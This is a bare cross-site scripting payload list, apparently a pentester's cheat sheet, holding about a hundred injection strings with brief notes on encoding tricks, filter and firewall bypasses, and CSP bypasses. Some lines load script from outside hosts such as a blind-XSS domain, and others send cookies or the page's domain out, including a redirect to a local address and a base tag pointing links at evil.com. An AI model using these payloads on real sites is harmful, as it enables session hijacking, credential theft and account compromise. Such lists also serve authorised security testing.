%u003Cscript%u003Eprompt%u0028303%u0029%u003C/script%u003E                       For ASP Encoding
%253Cscript%253Ealert(1)%253C%252Fscript%253E                                       double url enc
\<![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>    XML Reflectionxss
"onauxclick=alert(1);//
javascript://%250aalert(1)									  where :// is required after protocol
"\">\<s>test"@gmail.com															   XSS in email id
javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKTs='));
\<script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKTs='));\</script>
<imG/sRc=l oNerrOr=(prompt)() x>
"><script src=https://a007.xss.ht></script>											Blind 
<body onpageshow=alert(1)>
<style onload=alert(1)>
<marquee behavior="alternate" onstart=alert(1)>hack the planet</marquee>
<d3"<"/onclick="1>[confirm``]"<">z
&lt;script&gt;confirm(1)&lt;/script&gt;                                              HTML Encoding
“=””’></><script></script><svg onload=alert(1)>
<script>var xss = '';f=document.forms;for(i=0;i<f.length;i++){e=f[i].elements;for(n in e){if(e[n].type=='hidden'){alert(e[n].name+': '+e[n].value)}}};//'';</script>    GET Hidden Fields
<table><thead style=font-size:100px onmouseover=prompt(1)><td>XSS
<svg/x=">"/onload=confirm()//
<sCript x>(((confirm)))``</scRipt x>
<svg </onload ="1> (_=prompt,_(1)) "">
<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
<w="/x="y>"/ondblclick=`<`[confir\u006d``]>XXS
"><script/x>alert(1)</script/x>
<w="/x="y>"/ondblclick=`<`[confir\u006d``]>click
"><!--<iMg sRc=--><img src=x oNERror=(prompt)`1` x>"
"><deTails oNToggle=confi\u0072m(1)>"
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//127.0.0.1:8080");a.send();</script>   			   Get response back to server
<A/iD=x hREf=jav&#x09;ascript:prom&#x09;pt(doc&#x09;ument.coo&#x09;kie); id=x>XSS
data:,alert(1)
\'-alert(1)//
'}alert(1);{'
'}alert(1)%0A{'
\'}alert(1);{//
"><script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>                                          (CSP bypass if http://ajax.googleapis.com is whitelisted)
"><embed src='//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e){alert(1337)}//' allowscriptaccess=always>   (CSP bypass if http://ajax.googleapis.com is whitelisted)
<script src=data:,alert(1)>                                   when closing script tag is somewere 
<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>               xss in xml page
<x:script xmlns:x="http://www.w3.org/1999/xhtml" src="//brutelogic.com.br/1.js"/>
{{constructor.constructor('alert(1)')()}} 
<x ng-app>{{constructor.constructor('alert(1)')()}}   			                        angular JS
<SCRIPT SRC=//BRUTELOGIC.COM.BR/1></SCRIPT>                                             upper case
<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>                                                upper case
data:text/html,<svg onload=alert(1)>
<a/href=//0> shortest link injection
"\"><sCriPt sRc=//14.rs>"
<k onsubmit=alert(1)>                                                              before form tag
<k oninput=alert(1)>
foobar"/%0D<body='X' onmouseover=setInterval`alert\x28&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;\x29`//
<script ~~~>confirm(1)</script ~~~>
  <svg/onload=alert(cookie)>
window+=valueOf=alert(1)
[][`filter`][`constructor`](`ale`.concat(`rt\x28`.concat`0\x29`))();//
<script>([_,_____,_,_,__,___]=(__=[])+{___:__},[______,_,________,____,,_________,_______,__,,,__________]=[!!_____]+!_____+_____._____)[___+=_____+__________+__+______+_+________+___+______+_____+_][___](_________+_______+____+_+______+'(-~_____)')(__)</script>
<script>([,?,,,,??]=[]+{},[???,????,?????,??????,,???????,????????,?????????,,,??????????]=[!!?]+!?+?.?)[??+=?+??????????+?????????+???+????+?????+??+???+?+????][??](???????+????????+??????+????+???+'`1`')``</script>
"><svG oNLoad=confirm&#x28;1&#x29>   									when () and `` not working
<script>this[Object["keys"](this)[6]](1)</script>
<svgonload=alert(1)>		
<xss/ondblclick=[cookie].some(alert)>XSS													   	  space bypass
accesskey="X" onclick="alert(1)"													  Hidden Field
<svg/onload=t=/aler/.source+/t/.source;window.onerror=window[t];throw+1;//
<script>onerror=alert;throw document.domain;</script>  
javascript:void(a='//127.0.0.1');void(b=document.domain);void(c=a.concat(b));void(window.location.assign(c));                                               Cookie stealing with javascript protocol
<base href=//evil.com>     										change all hyper link to evil.com
<x onpointerenter=alert()>XSS		                                       onmouseover alternative
-alert(1)//\       (quoteless xss inside js context when param is refelcting 2 times in same line)
<html ontouchstart=alert(1)>XSS          										Mobile browser XSS
<h1/ondrag=confirm(1)>DragMe</h1>
<svg onload=setInterval`alert\x28document.domain\x29`>
[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164\50\61\51')() 										   				          Alert alternatives
(alert)(1)
a=alert,a(1)	
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
top['al\145rt'](1)
top[8680439..toString(30)](1)
<svg/onload=innerHTML=location.hash> #<img/src/onerror=alert(1)>
'"</Script><Html /Onmouseover=(alert)(1) //
<svg onload=alert&lpar;1&rpar;>
<svg onload=alert&#x28;1&#x29>
<svg onload=alert&#40;1&#41>
<svg onload=setInterval`alert\x28document.domain\x29`>
"><input type="submit" formaction="javascript&colon;this&lsqb;'a'&plus;'lert'&rsqb;`1`">
<body onpageshow=alert(1)>
<body onfocus=alert(1)>
" onfocus=alert(1) autofocus													auto trigger
<marquee/onstart=alert()>
<object data=javascript:alert(1)>
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
%253cscript%253ealert(document.cookie)%253c/script%253e
<audio/onloadstart=alert(1) src>
%u0025%u0075%u0066%u0066%u0031%u0063%u0073%u0063%u0072%u0069%u0070%u0074%u0025%u0075%u0066%u0066%u0031%u0065%u0061%u006c%u0065%u0072%u0074%u0028%u0018%u0058%u0053%u0053%u0019%u0029%u003b%u0025%u0075%u0066%u0066%u0031%u0063%u002f%u0073%u0063%u0072%u0069%u0070%u0074%u0025%u0075%u0066%u0066%u0031%u0065
%uff1cscript%uff1ealert(1);%uff1c/script%uff1e					
<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>                            akamai ghost wafbypass
------------------------------------------------------------------------------------------------
Events :
onxxxx
onauxclick
ondblclick
oncontextmenu
onpageshow
onpointerenter
onloadstart
ontouchstart

Reference 
https://research.digitalinterruption.com/2018/12/18/a-deeper-look-into-xss-payloads/

